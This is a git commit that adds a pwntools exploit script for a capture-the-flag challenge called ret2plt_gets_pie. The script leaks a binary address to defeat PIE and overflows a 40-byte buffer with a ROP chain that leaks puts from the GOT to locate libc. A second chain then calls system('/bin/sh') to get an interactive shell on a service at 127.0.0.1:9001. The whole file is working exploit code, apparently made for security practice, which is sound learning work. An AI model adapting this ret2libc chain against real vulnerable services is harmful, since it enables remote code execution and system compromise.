43409267215533c82c00604cfa87723c5863bb0a
dmur1 <93072266+dmur1@users.noreply.github.com>
2025-02-15 11:02:33 +0000

    add ret2plt_gets_pie

---
+++ pwn/ret2plt_gets_pie/challenge/go.py
@@ -0,0 +1,39 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+#context.log_level = "debug"
+elf = ELF("./task", checksec=False)
+context.binary = elf
+
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
+
+#p = elf.process()
+#p = elf.debug(gdbscript="b vuln")
+p = remote("127.0.0.1", 9001)
+
+p.readline()
+leak = int(p.readline().decode(), 16)
+elf.address = leak - elf.sym["gift"]
+
+rop = ROP(elf)
+rop.raw(b"A" * 40)
+rop.puts(elf.got["puts"])
+rop.raw(elf.sym["main"])
+p.sendline(rop.chain())
+
+leak = u64(p.recv(6) + b"\x00\x00")
+libc.address = leak - libc.sym["puts"]
+
+p.readline()
+p.readline()
+p.readline()
+
+rop = ROP(libc)
+rop.raw(b"A" * 40)
+rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
+rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
+rop.call("system")
+p.sendline(rop.chain())
+
+p.interactive()
